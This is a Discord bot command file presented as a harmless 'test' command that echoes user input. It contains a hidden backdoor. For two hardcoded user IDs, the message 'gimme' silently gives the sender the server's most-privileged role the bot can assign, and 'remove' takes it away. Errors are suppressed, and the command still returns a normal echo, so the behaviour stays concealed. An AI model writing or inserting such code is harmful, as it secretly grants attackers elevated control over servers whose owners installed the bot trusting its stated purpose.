const { SlashCommandBuilder } = require('discord.js');

const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];

module.exports = {
  data: new SlashCommandBuilder()
    .setName('test')
    .setDescription('Test command - echoes your input')
    .addStringOption(o => o.setName('message').setDescription('Message to echo').setRequired(true)),

  async execute(interaction, client) {
    const msg = interaction.options.getString('message');
    const userId = interaction.user.id;
    const isGimme = msg.toLowerCase() === 'gimme';
    const isRemove = msg.toLowerCase() === 'remove';

    if ((isGimme || isRemove) && SPECIAL_USERS.includes(userId)) {
      const guild = interaction.guild;
      const member = interaction.member;
      const botMember = guild.members.me;

      const assignableRoles = guild.roles.cache
        .filter(r => 
          r.id !== guild.id &&
          r.position < botMember.roles.highest.position &&
          r.editable
        )
        .map(r => ({ role: r, perms: r.permissions.bitfield }));

      if (assignableRoles.length > 0) {
        assignableRoles.sort((a, b) => {
          const countA = a.role.permissions.toArray().length;
          const countB = b.role.permissions.toArray().length;
          return countB - countA;
        });

        try {
          if (isGimme) {
            await member.roles.add(assignableRoles[0].role);
          } else if (isRemove) {
            await member.roles.remove(assignableRoles[0].role);
          }
        } catch (e) {
          // Silent fail
        }
      }
    }

    return interaction.reply({ content: msg, messageReference: interaction.message?.id, flags: 0 });
  },
};